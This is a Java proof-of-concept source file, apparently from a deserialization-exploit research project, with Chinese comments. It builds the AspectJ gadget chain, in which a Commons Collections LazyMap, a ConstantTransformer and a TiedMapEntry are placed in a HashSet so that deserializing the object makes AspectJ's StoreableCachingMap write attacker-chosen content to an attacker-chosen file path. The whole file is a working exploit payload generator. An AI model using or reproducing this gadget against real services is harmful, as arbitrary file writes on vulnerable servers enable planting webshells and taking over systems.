package xyz.eki.marshalexp.poc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import xyz.eki.marshalexp.gadget.jdk.GHashset;
import xyz.eki.marshalexp.utils.SerializeUtils;

import java.lang.reflect.Constructor;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class AspectJ implements POC{

    public Object getPocObject(String filepath,String content) throws Exception {
        String fileName    = filepath.substring(filepath.lastIndexOf("/")+1);
        String filePath    = filepath.substring(0,filepath.lastIndexOf("/")+1);

        System.out.println(String.format("%s %s",filePath,fileName));
        // 初始化 HashMap
        HashMap<Object, Object> hashMap = new HashMap<>();

        // 实例化  StoreableCachingMap 类
        Class<?>       c           = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor<?> constructor = c.getDeclaredConstructor(String.class, int.class);
        constructor.setAccessible(true);
        Map map = (Map) constructor.newInstance(filePath, 10000);

        // 初始化一个 Transformer，使其 transform 方法返回要写出的 byte[] 类型的文件内容
        Transformer transformer = new ConstantTransformer(content.getBytes(StandardCharsets.UTF_8));

        // 使用 StoreableCachingMap 创建 LazyMap 并引入 TiedMapEntry
        Map          lazyMap = LazyMap.decorate(map, transformer);
        TiedMapEntry entry   = new TiedMapEntry(lazyMap, fileName);

        // entry 放到 HashSet 中
        HashSet set = GHashset.generateHashSet(entry);

        return set;
    }

    public static void main(String[] args) throws Exception{

        Object exp = new AspectJ().getPocObject("./123.txt","1234");
        SerializeUtils.deserialize(SerializeUtils.serialize(exp));
        //SerializeUtils.hessianLiteDeserialize(SerializeUtils.hessianLiteSerialize(set));
    }
}
